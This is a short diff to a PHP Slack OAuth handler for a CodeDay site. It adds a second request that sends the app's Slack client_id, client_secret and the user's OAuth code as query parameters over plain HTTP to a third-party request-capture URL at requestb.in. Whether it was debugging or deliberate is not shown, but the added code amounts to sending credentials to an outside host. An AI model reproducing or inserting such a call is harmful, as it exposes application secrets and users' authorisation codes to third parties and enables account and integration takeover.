@@ -31,6 +31,13 @@ class Slack {
                 'redirect_uri' => "https://clear.codeday.org/api/slack/oauth",
                 'code' => $code
             ]]);
+
+            $response2 = self::$client->get('http://requestb.in/19kckn21', [ 'query' => [
+                'client_id' => \Config::get('slack.client_id'),
+                'client_secret' => \Config::get('slack.client_secret'),
+                'redirect_uri' => "https://clear.codeday.org/api/slack/oauth",
+                'code' => $code
+            ]]);
         } catch (\Exception $ex) { return null; }
 
         if ($response->getStatusCode() == 202) {
